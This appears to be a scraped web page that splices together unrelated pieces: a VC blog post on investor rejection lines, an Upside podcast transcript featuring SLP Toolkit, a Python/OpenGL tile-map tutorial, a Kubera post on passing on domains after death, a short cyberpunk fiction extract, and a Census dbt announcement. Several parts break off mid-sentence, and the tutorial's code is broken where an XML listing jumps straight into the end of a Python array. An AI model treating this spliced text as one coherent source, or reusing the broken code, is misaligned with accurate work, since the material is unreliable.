<p>Admittedly it’s a valid question — what if the 800 lb gorilla in your space does copy you? What is your edge? How will you win?</p>
<p>Here are a couple of answers that may help:</p>
<p>A. Large companies are so large, they aren’t able to prioritize or even care about your “small” opportunity relative to their huge company. In the case of Google specifically, it has actually been shown that building a Google product competitor can actually be a great opportunity.&nbsp; Many people would much prefer to pay for products so that they can get customer support when something goes wrong — a free Google product will never a customer’s calls or emails.</p>
<p>Companies like Mixpanel, Optimizely, Superhuman, and many more have built big businesses by going head-to-head with a free Google product by charging customers and providing a better experience.</p>
<p>So it’s actually&nbsp;<em>validation</em> of your market if Google is interested in your space.</p>
<p>B. Big companies, by definition, are no longer nimble.&nbsp; You, in contrast, are able to run circles around them.&nbsp; Can you prove that you’re nimble by shipping quickly?&nbsp; Can you show that customers love you more than Google?&nbsp; These are concrete things that you can point to in your conversations with VCs.</p>
<p><strong>2) We don’t invest in hardware (only to find out that they led a round for hardware) (<a href="https://twitter.com/PeterJColbert">@peterjcolbert</a>)</strong></p>
<p>This is an interesting one, because you see VCs deviate from their thesis sometimes.&nbsp; (Every VC does it – we’ve done it too.).&nbsp; VCs will often say they don’t invest in hardware.&nbsp; Or ad revenue based models.&nbsp; Or e-commerce.&nbsp; Or in some geography.&nbsp; And then you see a portfolio company on their website that is clearly in one of these categories.</p>
<p><em>You should just ask a VC about it directly.&nbsp;&nbsp;</em></p>
<p>The reason for this is usually along one of these lines:</p>
<p>A. They used to invest in that category but are now over-indexed. Or they invested in that category previously as an angel or with a past fund. I.e. they&nbsp;<em>used to make those investments but no longer do</em>.</p>
<p>This is important to understand, because if the reason the firm is passing is that they are waiting for some liquidity on existing positions in your space, there could potentially still be an opening for an investment later.&nbsp; This is rare, BUT possible – this has happened once to a company that I’ve backed before.</p>
<p>B. They are experimenting outside their thesis. E.g. They may not usually invest in South America, but they may make 1 investment to learn about the market. They may not invest in hardware, but may invest in 2 companies to learn about the space.</p>
<p>Unfortunately, if this is the case, you can try to hard to convince a VC to do more experimentation in that category, but because VCs have mandates — i.e. they have an agreement with their investors that they would focus on investing in certain categories / theses, they will likely not want to deviate *too* much from their thesis.&nbsp; VCs are judged by their investors on whether they end up investing based on the strategy that they claimed they would.</p>
<p>C. They had a special relationship with the founder.</p>
<p>There is nothing you can do about this.&nbsp; People back their friends all the time regardless of what they are building.</p>
<p>I think it’s easy to walk away fuming mad thinking that a firm is filled with hypocrites, but it’s worth just bringing up with a VC:&nbsp;“Hey you mentioned that you don’t do hardware, but I noticed on your website that you’ve invested in X.&nbsp; Am curious how that fits your thesis?” You may not like the response and it may not change anything, but on rare occasion it may open a door for you.</p>
<p><strong>3) I don’t think this can be a venture scale business. (<a href="https://twitter.com/kirbywinfield">@kirbywinfield</a>)</strong></p>
<p>I’m of two minds on this one.</p>
<p>A. There are a lot of companies who seek out venture funding who are actually NOT a good fit for VC investors.&nbsp; Entrepreneurs should be aware of the return profile that VCs are looking for.&nbsp; Loosely speaking, VCs are looking for a minimum of 100x return in the course of 5 years or so.&nbsp; This comes out to achieving roughly $100m runrate within the next 5 years.&nbsp; Is this what you want to do?</p>
<p>B. However, on the flip side, what ideas will be able to achieve $100m runrate in 5 years is tough to say. VCs often have preconceived notions above what can get to this level and what cannot — <em>and they are often wrong</em>. Companies that tend to get overlooked are in categories such as e-commerce, for example.&nbsp; Are you selling a widget that will likely max out at $5m in sales per year?&nbsp; Or are you the next Stitch Fix?</p>
<p>My advice here would be to first understand for yourself if you want to be growing a business that goes to $100m in annual revenue in 5 years (and the work / hiring that will be required to do so). And if so, what do you think that path looks like if everything goes well?&nbsp; How will you get to $2m runrate this year and then more than double your sales each year thereafter?</p>
<p>And if the answer is that you don’t want to run this type of business, there are other avenues of funding.&nbsp; Angel funding, crowdfunding, revenue-based financing are all good channels that are now rapidly growing.</p>
<p><strong>4) But how will you manage being a mom AND running a startup? (<a href="https://twitter.com/HustleFundVC">@hustlefundvc</a>)</strong></p>
<p>Ugh.&nbsp; Are we in the 21st century?&nbsp; Move on from any VC who asks this.&nbsp; It’s not worth it.</p>
<p><strong>5) We’d be interested when we see a bit more traction. (<a href="https://twitter.com/msuster">@msuster</a>)&nbsp;</strong></p>
<p>Ah, the classic ask for more traction.&nbsp; Basically, the VC doesn’t have conviction right now, but maybe, just maybe, more traction would give him/her the conviction to do your deal.&nbsp; The reality is that most investors can’t articulate what level of traction they would want to see in order to invest.&nbsp; Obviously, if you earn $100m in the next 2 months, everyone will be onboard, but what if you get to $100k / mo runrate in the next year — is that interesting?&nbsp; Well…it depends.&nbsp; And unless you are an asshole or a fraudster, VCs always want to preserve optionality to see you in a year and check on your business.</p>
<p>So, although this is a frustrating response, the right way to play this is to triage investors quickly.&nbsp; Put this VC in a “not interested” bucket. Continue to send him/your monthly investor updates, but you’re better off trying to find someone who has conviction today than trying to convince someone to get conviction — even with traction.&nbsp; You just need to meet a lot of investors and triage a lot of investors quickly in order to find the right investors to bring into your company.</p>
<p><strong>6) Maybe you should raise more and grow quicker. (<a href="https://twitter.com/JustinPUSHAS">@justinpushas</a>)</strong></p>
<p>This is just a stupid comment.&nbsp; If a VC really believes in your business, he/she will commit to your round, and will either help you fill your larger round or write a bigger check.&nbsp; But, investors who say things like this without any action are either just oblivious or not helpful, and should just move on from these investors. As we all know, founders who struggle to raise $250k are also going to have a tough time raising $2.5m.</p>
<p>That being said, I would recommend that every founder <a href="https://elizabethyin.com/2016/03/13/you-should-have-4-fundraising-plans/">develop multiple fundraising plans</a>.&nbsp; This will allow you to pitch a different amount of money to bigger or smaller investors with different milestones and goals that you would achieve with different investment sizes. And then if you do receive this question, you can point to a larger fundraising plan and mention that you have thought about a larger plan and are open to raising more money but are also not limited in growth if you cannot raise that amount now.</p>
<p><strong>7) Come back when you have a lead (<a href="https://twitter.com/stefanopep3">@stefanopep3</a>)</strong></p>
<p>The herd of sheep comment!&nbsp; A variation on this is, “I’m committed once you have a lead.” This is a positive way for a VC to say no for now, but if you have enough fundraising traction, then he/she wants to get his/her foot in the door.</p>
<p><span>It’s important to clarify what a VC means by this, though.&nbsp; Does this mean he/she is interested:&nbsp;</span></p>
<ul>
<li><span>When you have most of your round committed? </span></li>
<li><span>Once terms have been set?</span></li>
<li><span>If another investor is taking a board seat and is providing “serious responsibility ” for the investment.&nbsp; (i.e. no party rounds)?</span></li>
</ul>
<p><span>This is important to clarify, because VCs mean different things when they ask about a lead VC.&nbsp; </span></p>
<p><span>If it’s the former — come back when most of the round is committed — you can build your round in many different ways.&nbsp; You can bring together a party round of smaller investors without a lead on a convertible note or SAFE.&nbsp; It’s actually quite common these days for a smaller fund to set terms on a note or a SAFE and bring together a round that way.&nbsp;&nbsp;</span></p>
<p><span>And if a VC is just looking to evaluate terms, then you can create your own terms on a note or a SAFE and present those to the VC.&nbsp;</span></p>
<p>And lastly, if the VC is looking for a true “lead VC” to invest the majority of the round and take a board seat, etc, then this is a completely different ask from the prior two.</p>
<p><strong><span>8) Let me know how I can help!&nbsp; Founder asks for help. *crickets* (<a href="https://twitter.com/Quan">@quan</a>)</span></strong></p>
<p>When I started my VC career, I asked this question to a few entrepreneurs I met with.&nbsp; I genuinely wanted to be helpful.&nbsp; Then I quickly realized that there was literally nothing I could help with.&nbsp; Hah.&nbsp; Every founder just wanted investment dollars, and if I weren’t investing, I couldn’t even do introductions to other investors, because it would be a bad signal.</p>
<p><strong>9) Nothing. They ghost you. (<a href="https://twitter.com/ameetshah">@ameetshah</a>)</strong></p>
<p>*crickets*</p>
<p><strong>10) Contact us if you like but we prefer warm introductions. (<a href="https://twitter.com/cwlucas">@cwlucas</a>)</strong></p>
<p>I find this ironic — VCs prefer warm introductions, and YET, there are a lot of VC analysts who send outbound emails to startups completely cold asking to chat!</p>
<p>My recommendation here is to try to get a warm referral to a VC.&nbsp; Just in general, it’s always better …</p></div></div>

And what does that look like? Oh, I’ve got credit cards, and I have a life insurance policy that I can take from and my husband can borrow from his 401k. And, you know, Lisa moves in with her parents. And you know, so we’re making all of these like, Okay, how are we going to pull up this money and and where is it going to come from?</p><p>Jay Clouse 0:20<br> The startup investment landscape is changing. and world class companies are being built outside of Silicon Valley. We find them, talk with them and discuss the upside of investing in them. Welcome to Upside.</p><p>Eric Hornung 0:48<br> Hello, hello, hello, and welcome to the Upside podcast, the first podcast finding upside outside of Silicon Valley. I’m Eric Hornung and I’m accompanied by my co host Mr. Educational upbringing himself, Jay Clouse. Jay, how often were you smacked on the knuckles with rulers growing up?</p><p>Jay Clouse 1:11<br> Not enough. Honestly. I needed more of that. No, that was not the form of what is it? Corporal punishment, capital punishment.</p><p>Eric Hornung 1:20<br> Catholic punishment, mostly.</p><p>Jay Clouse 1:21<br> Catholic punishment. That was not the form of punishment in my household. But you are right, which I think we talked about on the show before both my parents were high school teachers growing up, took both of their classes in high school as a matter of fact, and just about my entire extended family, high school or middle school teachers, including my sister and her husband, my aunt’s my uncle’s, my cousins. Everybody’s teaching Eric, did you try harder when it was your parents as the teacher or less hard when it was your parents the teacher, I wouldn’t say I tried more or less hard, but I can tell you that my mother’s class is where I was closest to getting an A minus in high school?</p><p>Eric Hornung 2:02<br> Wait, you get an A in every class in high school?</p><p>Jay Clouse 2:04<br> I had over a 4.0. I was a valedictorian.</p><p>Eric Hornung 2:07<br> You with your little subtle bragging there. Look at that. You tried it, you try to sneak that by?</p><p>Jay Clouse 2:12<br> No, I thought it was obvious.</p><p>Eric Hornung 2:14<br> It should have been. That’s my fault. You know, 200 episodes in I should have known that. You were the valedictorian of your high school.</p><p>Jay Clouse 2:20<br> And here’s where that really plays against you. I thought my mom’s class was boring. There. I said it, I didn’t appreciate it at the time she taught English. I forget exactly how I’m so sorry, mom. I forget exactly what the class was. I think it was.</p><p>Eric Hornung 2:34<br> Your mom listens to this podcast.</p><p>Jay Clouse 2:36<br> Oh, she does. I forget the class. But I just thought was kind of boring. And I would fall asleep sometimes because it’s in the afternoon and you know, our classes, like we got to school like 6:30 in the morning. And I slept in class from time to time, which would come up at dinner. And she would say, you know, I think you need to go to bed earlier because you’re falling asleep in class. And I would say, well, your class is boring. Yeah. rough, rough semester.</p><p>Eric Hornung 3:05<br> Do you ever think that maybe that’s the reason you were close to an A minus in that class?</p><p>Jay Clouse 3:08<br> It’s very possible.</p><p>Eric Hornung 3:12<br> Well, teachers have just a bit of a tough go of it. Jay. I feel like there’s, I think a lot of people are seeing now with this whole COVID thing. Dealing with one little human is a lot but dealing with 30 of them at a time all day every day.</p><p>Jay Clouse 3:25<br> Yeah, I think working at an elementary or even just a K-12 level is a really difficult job both as a teacher and as we’ll probably find out today, Eric, because we’re talking with Lisa Kathman and Sarah Bevier, they are the co founders of SLP Toolkit. SLP Toolkit is a web based app with built in assessments and tools that give a school based speech language pathologist the confidence she needs to take charge of her busy caseload. Eric, I have a feeling that The speech language pathologists in the school system are struggling just as much as the teachers are these days, and I’m sure that will come up in our conversation.</p><p>Eric Hornung 4:10<br> I think she wanted to go by Bevier. It just so we’re on the same page.</p><p>Jay Clouse 4:14<br> She wanted to go by Bevier, but can you confirm it’s pronounced Bevy air, and I will not apologize for pronouncing it correctly.</p><p>Eric Hornung 4:20<br> It’s like the Colbert. Colbert thing. You know, when he became famous, he went from Stephen Colbert to Stephen Colbert.</p><p>Jay Clouse 4:27<br> I don’t know all that much about speech language pathologists. I do know that it seems like a really noble profession and helps people with speech and language challenges to live their best life. And speaking of living their best life. This episode is sponsored by Ethos Wealth Management, helping people live the one life they have to live the best way that they can.</p><p>Eric Hornung 4:49<br> And you can find out more about ethos@upside.fm/ethos. We’re gonna jump into this interview in a second here, Jay,</p><p>Jay Clouse 4:57<br> But one more thing that we should mention, SLP toolkit, which was founded in 2015 has been bootstrapped this whole time.</p><p>Eric Hornung 5:04<br> And I love talking to a bootstrap company because you have the optionality. If you’re profitable to raise capital and grow like crazy or not.</p><p>Jay Clouse 5:12<br> Bootstrapped in Phoenix, Arizona, no less, and I believe this is our first, definitely our first Phoenix company, if not at first Arizona company.</p><p>Eric Hornung 5:19<br> Shout out to Matt Simpson, who connected with us on Twitter and introduced us to SLP toolkit. We’re excited to talk to more Phoenix companies, or just Arizona companies in general. If you are a Arizona company or know in Arizona and company that would like to be on the podcast, reach out to us on Twitter @upsideFM, or send us something a little longer at hello@upside.fm and we will get to this interview right after this. Let’s bring in Devin Spencer, and employment attorney at Taft Stettinius and Hollister teach us about handling employee matters. Taft is a full Service firm known for assisting entrepreneurs across the Heartland. As a reminder, the following remarks by Taft attorneys are for informational purposes only and are not legal advice. This information is not intended to create and receipt of it does not constitute an attorney client relationship. No person or organization should act upon this information without first seeking professional counsel.</p><p>Jay Clouse 6:23<br> Devin, something that comes up a lot with founders I talked to in Columbus and outside of Columbus is the difference between contractors and employees and when it makes sense to hire one or the other. Can you help us to understand that difference in when a founder should consider hiring a contractor versus an employee.</p><p>Devin Spencer 6:40<br> Your company must classify or treat workers as either independent contractors or employees. You also have to further classify employees as exempt or non exempt but I won’t go into that at the time we have. Employees generally must be paid minimum wage and overtime pay and the company pays employment taxes and Social Security employees. Independent contractors are not subject to those minimum wage and overtime pay requirements, and the company doesn’t pay those employment taxes for independent contractors. wrongfully classifying or treating employees as independent contractors can be a major source of very expensive liability. Unfortunately, there is no bright line test to determine whether an individual is an independent contractor or an employee. The short answer is that it is all about your company’s oversight and control of the nature of the work and how the workers performance. If you are only controlling the results of the work, you may have an independent contractor. On the other hand, if you retain oversight over the method in the manner of the work, it is likely an employee, the law, not you decides whether you’ve hired an independent contractor or an employee, you must structure the working relationship to either retain or relinquish control to the worker, overall the nature of the work and how they perform it. If it is a task where you makes sense to only care about the result, not the means to that result, you may have an independent contractor. If your company controls the nature of the work and how the workers are performing it. You probably have an employee. I will say the Department of Labor which enforces these laws has been cracking down on misclassification like crazy lately, your company could end up paying a lot of back pay taxes and benefits if you get it wrong.</p><p>Eric Hornung 8:25<br> Devin, if people want to learn more about Taft or yourself, where should they go?</p><p>Devin Spencer 8:30<br> Our website is www.Taftlaw.com and you can search by practice group or individual attorney.

<p>In this post, I show how to draw many tiles from a single-layer level created with Tiled. I also show how to take a screen capture with OpenGL.</p>



<p><em>This post is part of the <a href="https://www.patternsgameprog.com/series/opengl-2d-facade/">OpenGL 2D Facade series</a></em></p>



<h2>Objective</h2>



<p>In the <a href="https://www.patternsgameprog.com/opengl-2d-facade-6-draw-a-tile/">previous post</a>, we drew a single tile, thanks to “magic” formulas to compute the coordinates in the texture and the screen. We can repeat these computations to render a level (with a single layer, we’ll see later how to handle more):</p>



<div><figure><img loading="lazy" src="https://www.patternsgameprog.com/wp-content/uploads/2020/08/07_level.png" alt="Single layer level with Python and OpenGL" width="519" height="345" srcset="https://www.patternsgameprog.com/wp-content/uploads/2020/08/07_level.png 960w, https://www.patternsgameprog.com/wp-content/uploads/2020/08/07_level-300x200.png 300w, https://www.patternsgameprog.com/wp-content/uploads/2020/08/07_level-768x512.png 768w" sizes="(max-width: 519px) 100vw, 519px"></figure></div>



<p><em>Note: I am using free tiles created by Pipoya. I extracted some of them to build a tileset for this post; you can find more on the itch.io page: <a href="https://pipoya.itch.io/pipoya-rpg-tileset-32x32" target="_blank" rel="noreferrer noopener">https://pipoya.itch.io/pipoya-rpg-tileset-32×32</a></em>.</p>



<h2>Create raw level data</h2>



<p>I propose to use Tiled to create a level with 30 columns and 20 rows. I don’t describe Tiled in this post; you can get details <a href="https://www.patternsgameprog.com/discover-python-and-patterns-23-create-levels/">here</a>.</p>



<p>The trick is to save the level in a CSV format, and then copy the tile ids in the&nbsp;<code>&lt;data encoding="csv"&gt;</code>&nbsp;XML tag:</p>



<pre data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;map version="1.2" tiledversion="1.3.1" orientation="orthogonal" renderorder="right-down" compressionlevel="0" width="30" height="20" tilewidth="32" tileheight="32" infinite="0" nextlayerid="3" nextobjectid="1"&gt;
 &lt;editorsettings&gt;
  &lt;export target="level0..tmx" format="tmx"/&gt;
 &lt;/editorsettings&gt;
 &lt;tileset firstgid="1" name="grass" tilewidth="32" tileheight="32" tilecount="1024" columns="32"&gt;
  &lt;image source="grass.png" width="1024" height="1024"/&gt;

], dtype=np.int32)</pre>



<h2>Convert raw level data</h2>



<p>The&nbsp;<code>rawLevel</code>&nbsp;array is a one-dimensional array with 30*20=600 values. To ease the rendering, we need a three-dimensional array with 30 per 20 (x,y) coordinates:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">textureTilesPerRow = textureWidth // tileWidth
levelWidth = 30
levelHeight = 20
rawLevel = rawLevel.reshape((levelHeight, levelWidth))
level = np.empty((levelWidth, levelHeight, 2), dtype=np.int32)
for y in range(levelHeight):
    for x in range(levelWidth):
        tileId = rawLevel[y, x] - 1
        level[x, y, 0] = tileId % textureTilesPerRow
        level[x, y, 1] = tileId // textureTilesPerRow</pre>



<p>Line 1 computes the number of tiles per row in the tileset. We need this value because Tiled defines tile ids from left to right and then top to bottom.</p>



<p>Lines 2-3 store the with and height in variables.</p>



<p>Line 4 reshapes the raw level: its new shape is (20, 30). As presented in previous posts, Numpy stores data per row: the first index of a 2D array is the row and the second one the column. As a result, the 2D shape of the raw level is&nbsp;<code>(levelHeight, levelWidth)</code>&nbsp;and not&nbsp;<code>(levelWidth, levelHeight)</code>.</p>



<p>Line 5 creates a&nbsp;<code>level</code>&nbsp;Numpy array with shape&nbsp;<code>(levelWidth, levelHeight, 2)</code>&nbsp;and 32-bit integers. The Numpy function&nbsp;<code>empty()</code>&nbsp;does not initialize the content of the array. We should use this function with care since the array can have any values. In this example, it is not a problem since we set every cell of this array right after.</p>



<p>Last lines iterate through all the cells in the level. For each cell of coordinates&nbsp;<code>(x,y)</code>&nbsp;it reads the id of the tile (line 7). Note that we subtract one because Tiled reserves the zero value for empty cells. Then, we compute the x coordinates of the tile from the id (line 8), and similarly for the y coordinates (line 9).</p>



<h2>Create the window</h2>



<p>We create the window as before, except for the size of the rendering area:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">screenWidth = tileWidth * levelWidth
screenHeight = tileHeight * levelHeight
screenTileWidth = 2 * float(tileWidth) / float(screenWidth)
screenTileHeight = 2 * float(tileHeight) / float(screenHeight)
screenSize = (screenWidth, screenHeight)
pygame.display.set_mode(screenSize, pygame.DOUBLEBUF | pygame.OPENGL)
pygame.display.set_caption("OpenGL 2D Facade - https://www.patternsgameprog.com/")</pre>



<p>The window size defined in lines 1-2 now depends on the size of the level.</p>



<h2>Mesh data</h2>



<p>The mesh data is composed of vertices, faces (vertices index), and a UV map (coordinates in the texture). This time, we create as many rectangles as there are cells in the level:</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">vertices = np.empty([levelWidth, levelHeight, 4, 2], dtype=np.float32)
uvMap = np.empty([levelWidth, levelHeight, 4, 2], dtype=np.float32)
faces = np.empty([levelWidth, levelHeight, 4], dtype=np.uint)
faceCount = 0
for y in range(levelHeight):
    for x in range(levelWidth):
        spriteScreenX1 = -1 + x * screenTileWidth
        spriteScreenY1 = 1 - y * screenTileHeight
        spriteScreenX2 = spriteScreenX1 + screenTileWidth
        spriteScreenY2 = spriteScreenY1 - screenTileHeight
        vertices[x, y, 0] = [spriteScreenX1, spriteScreenY2]
        vertices[x, y, 1] = …</pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Even experienced domainers may not know the name Igal Lichtman. The legendary domain investor was better known by his business name, Mrs Jello.<br></p><p>Over a career spanning decades, Lichtman acquired a vast portfolio of investment domains, many worth tens of thousands of dollars. But it was what happened after Lichtman passed away in 2013 that should serve as a cautionary tale to <em>all</em> domainers.</p><h2>What Happens to Your Domains When You Die?<br></h2><p>What happens to your domains <a href="https://www.kubera.com/blog/what-important-financial-information-should-my-family-know">when you die</a> depends on how you prepare for the inevitable.</p><p>In Lichtman’s case, there wasn’t nearly enough preparation, if any. When Lichtman died from cancer complications in February of 2013, his family was left with the difficult task of trying to organize and gain access to his vast portfolio of investment domains.<br></p><p>But as his family learned, Lichtman hadn’t created a clear path for his beneficiaries to take ownership of his domains. As they expired, they were <a href="https://www.thedomains.com/2013/02/22/after-75k-in-lost-domains-igal-in-death-teaches-us-we-need-an-after-life-plan/" target="_blank">auctioned off by their registrars</a>.&nbsp;<br></p><p>The same month that Lichtman died, Vodka.net sold for $20,000. Penis.net was auctioned for $5,015. And in one of the biggest sales from Lichtman’s portfolio, Vegans.com sold for $48,000.<br></p><p>This is all money that could have gone to Lichtman’s beneficiaries. They could have kept those domains as investments, or sold them for an immediate payout for Lichtman’s family. Instead, those big payouts went to the domain registrars and auction companies that facilitated the sales.<br></p><h2>What Happened To Igal Lichtman Could Happen To Anyone<br></h2><p>Igal Lichtman made a career out of investing in domains, so his death (and the subsequent loss of his entire portfolio) made waves in the domainer world.<br></p><p>But this isn’t something that only happens to professional domain investors.<br></p><p>Jane Both, a lifelong entrepreneur from Milford, Pennsylvania, was just 50 years old when she <a href="https://www.recordonline.com/article/20170331/obituaries/303319989" target="_blank">died suddenly</a> while walking her dogs in her neighborhood in late March of 2017. Both was involved in all kinds of business ventures, including Streamline Management of Port Jervis, a home inspection service. But she was also savvy when it came to domain investing. In 2013, long before many people were considering the potential of blockchain domains, Both was buying as many as she could find.<br></p><p>Her portfolio eventually consisted of more than 100 domains containing the “blockchain” keyword — including appealing domains like BlockchainManagement.com, BlockchainAssets.com, BlockchainFinance.com, BlockchainPro.com, and BlockchainTools.com.<br></p><p>But you can probably guess where this story is going. Like Lichtman, Both didn’t plan for what would happen to her domains after her death. And so, in 2018, they <a href="https://www.thedomains.com/2018/01/18/100-expiring-blockchain-domain-auctions-next-5-days/" target="_blank">began to expire and head to auction.</a><br></p><figure id="w-node-eb256527c8e9-ac468d02"><p><img src="https://uploads-ssl.webflow.com/5ded36b5e942e74b13468d23/5f32b6a8e3394406d2d74bf9_01-Image%402x.png" alt="what happens to your domains when you die"></p></figure><p>Of the more than 100 blockchain domains Both owned, many sold for thousands of dollars, and many more for hundreds. In all, her beneficiaries missed out on tens of thousands of dollars that resulted from the sale of all of Both’s domains — money that should have gone to her loved ones, but instead went to registrars and auction companies.<br></p><h2>It’s Time to Treat Domains Like Any Other Wealth Asset<br></h2><p>These stories make one thing clear: Whether you purchase domains for the express purpose of investing in them, or just own the domains for your business or personal websites, domains can be valuable and sentimental, and they should be treated like any other digital wealth asset. In the digital age, anyone who owns a domain needs a plan in place for someone to take ownership of and manage it after their death.<br></p><p>Most domain registrars have a process in place for when an account owner dies. For example, GoDaddy, one of the world’s largest domain registrars, <a href="https://www.godaddy.com/help/how-to-gain-access-to-domainsaccounts-after-owners-death-8356" target="_blank">outlines steps</a> for what to do and how to gain access to domains or accounts after their owner’s death.<br></p><p>But even when a registrar has a process in place, it can be complicated for beneficiaries who aren’t well versed in domains and digital assets. And then there’s the question of whether your beneficiaries will even <em>know</em> what domains you own, whether they have value, and how to seek access to them.<br></p><p>You can’t leave this process to chance, or just assume that your beneficiaries will know to follow your registrar’s steps to take control of your domains. You have to be proactive to protect your domain investments.<br></p><h2>How to Protect Your Domain Investments: Step By Step<br></h2><p>Ready to make sure your domains are protected in case of the worst? Here’s what you need to do.<br></p><h3>Create a Digital Inventory<br></h3><p>We rarely think about how many online accounts we create all the time. From social media, to streaming sites and Spotify, ecommerce sites, food delivery, and, of course, our domains — there are <em>tons</em> of sites that have our personal information and, oftentimes, payment information stored. Making sure your beneficiaries have access to all these accounts will greatly simplify the process of organizing and closing them after your death.<br></p><p>That’s why, for domains, but also <em>all</em> other digital assets and accounts, <a href="https://www.kubera.com/blog/using-excel-or-google-sheets-for-tracking-net-worth">everyone should have a digital inventory</a>. This should include every account you own, passwords, associated phone numbers and email addresses, and, for any accounts that require payments or renewals, the dates and costs for renewal.<br></p><p>Your digital inventory should be available <a href="https://www.kubera.com/blog/which-important-financial-documents-should-you-safekeep">both online and offline</a> (like in a safe deposit box that a trusted beneficiary can access) and should be updated regularly.<br></p><h3>Write a Digital Will<br></h3><p>If you’re a sole trader or proprietor, your business assets, including domains and other digital assets, are legally indistinguishable from you, and would be distributed <a href="https://www.kubera.com/blog/wills-trusts-and-estate-planning-not-enough-to-protect-wealth">according to your will</a>.<br></p><p>However, it’s becoming a more common practice for people who hold a variety of digital wealth assets to write a digital will, specifying exactly how they want things like their domains passed on after their death. It’s also becoming a more common practice to name a digital executor for that will — someone who has the knowledge and experience to ensure that digital assets are transferred safely and correctly.<br></p><h3>Use a Portfolio Manager That’s Made for the Digital Age<br></h3><p>It’s long been standard practice to use a portfolio manager for tracking net worth and organizing investments in one place — a good practice that makes them easier to distribute after you’re gone.<br></p><p>But as we move forward in the digital age, wealth and investments are becoming more complex, and most traditional portfolio managers aren’t up to the task of <a href="https://www.kubera.com/blog/portfolio-manager-to-track-fiat-currency-crypto-portfolios">tracking digital wealth like crypto wallets, multi-currency accounts, and domains</a>. That’s why you need a portfolio manager that’s made for the digital age. That’s why <a href="https://www.kubera.com/">you need Kubera</a>.<br></p><p>Not only does Kubera allow you to track <em>all</em> your wealth assets — from the traditional, like stocks, bonds, bank accounts, cash, and real estate, to the modern, like collectibles, crypto exchanges and wallets, domains, and other digital assets. Kubera is also made to ensure safe and secure transfer of <em>all</em> your wealth to a beneficiary in the event something happens to you. You can even set a beneficiary to receive access to your portfolio automatically if your account becomes inactive for a set period of time.<br></p><p>Kubera is the only way to manage and protect your wealth in the digital age.

  <p><span>26 Aug 2020</span></p><p><em>Fiction. An extract from an untitled novel in progress.</em></p>

<p><em>In a not so distant future, brainware has become a staple part of life. The wealthy enjoy highend ad-free custom gear, the rest make do with malware riddled memory harvesters.</em></p>

<p>In the end, they all talk. Some in quiet whispers, others spitting out rage and despair. For some, it takes mere minutes, for others hours, even days. When it finally happens, she is there to experience the subject’s memory for one last time.</p>

<p>Of course, the technology isn’t perfect. No technology ever is. Some subjects don’t yield even after weeks of disassembly. By that time, the data becomes too corrupt to trust and the subject too unstable. Neural bits flip and decay. Termination is recommended and probably the kindest, too, but in this profession the latter is usually of little consequence.</p>

<p>Once the neural imprint is extracted, the true fun ( or what fun constitutes for people of her kind anyway) can begin. It’s not strictly necessary for a memcracker to run every single neural imprint through the scanner before emulation and extraction. Some wiseass somewhere has already made a  memoryValidator that checks for corrupt loops and other funzies that tech savvy subjects sometimes leave as boobie traps or – as she prefers to see it – Easter eggs for those like her that think nothing of violating the privacy of the mind, least of all when the price is right.</p>

<p>And the price is very right for this one.</p>

<p>Most state of the art emulators, like the neuro-qemu she’s using already pre-validate the sample before emulation anyway. So scanning the thing would just be wasted cycles at this point.</p>

<p>But you can never be too careful with the stuff you find inside these subjects. The cargo these neural bits are carrying is worth a lot of good quality cycles in the brainscapes and she needs it. It’s tempting to skip the scanning – just take the bit dump and pump it into emulator, but there could be traps – scandetectors, emulator probing, emulator corruption, hell and for the most daring emulator escape and total bluepilling of the whole system.</p>

<p>That’s how they’d lost x0r a year ago. The payload he was studying contained your basic everyday ROP shellcode to divert the emulators execution. It was script kiddie material – okay, maybe a bit more advanced, but x0r had forgotten to turn off address space layout randomization after fucking around with some crackmes for fun. The payload was triggered and swallowed the emulator whole and along with it a good chunk of x0r. He was lucky it was script kiddie grade and she and a few others eventually unfucked him. What was the lesson learnt here? Never fuck around where you eat? Never eat where you fuck? She was never very good at learning lessons anyways.</p>

<p>And in any case, rushing to the prize would make it less savory.</p>

<p>It’s a privilege to be the last living being who gets to enjoy these rare moments before they are packaged and shipped off to the highest bidder for whatever nefarious purpose. This week, she’s already experienced an early morning kiss between secret lovers, a mother’s joy in seeing an infant’s smile and the pain of a parent’s limp hand on a hospital bed.</p>

<p>Great moments, but still not the same as experiencing them from the front row. A lame consolation prize for someone who one night 5 years ago woke up with a mind and no memories left.</p>

With our new native dbt support, you can take advantage of shared query logic across all your models, &nbsp;and create “last-mile” models that are automatically synced into apps like Salesforce, Marketo, etc. This is the first data modeling integration we’ve ever built in Census and we think it’s the first of its kind for dbt too.</p><p>We’ve <a href="https://blog.getcensus.com/meet-census/">mentioned</a> <a href="http://getdbt.com/">dbt</a> as an emerging piece of technology in the <a href="https://blog.getcensus.com/graduating-to-the-modern-data-stack-for-startups/">modern data stack</a>. For those of you who aren’t familiar, dbt is a tool that helps you write &amp; run SQL transforms in your data warehouse. The key benefit of using dbt is that your SQL is stored in version control, which means there’s a history of all changes. This makes it much easier for teams to collaborate. The other key feature of dbt is that you can create shared logic for your SQL code (e.g. you can build intermediate views on your data or you can write macros for repetitive parts of your queries). All of this makes it an ideal tool for the modern data stack where you can maintain all the code that cleans &amp; prepares your data for action.</p><blockquote>Census can now materialize select dbt models directly into your external tools like Salesforce, Marketo, Customer.io, etc.</blockquote><p>As of today in Census, you can connect to a dbt project stored on GitHub, select models whose output you’d like to make available for publishing, and take advantage of our sync engine to get the data into the hands of your business teams. Let’s walk through what this looks like in practice.</p><ol><li><strong>Connect to GitHub</strong>. When you go to the Models tab, you’ll be prompted with a choice to either store &amp; edit SQL directly in Census or connect to GitHub and select a repository where you keep your dbt data models. You don’t need to create a new project for Census – you can keep all your transform logic in one repository.</li><li><strong>Select models for Census</strong>. By default when you connect a new dbt project, Census will only look for models that have been tagged with the keyword <code>census</code>. This way you can decide which models or groups of models should be available for Census to sync into 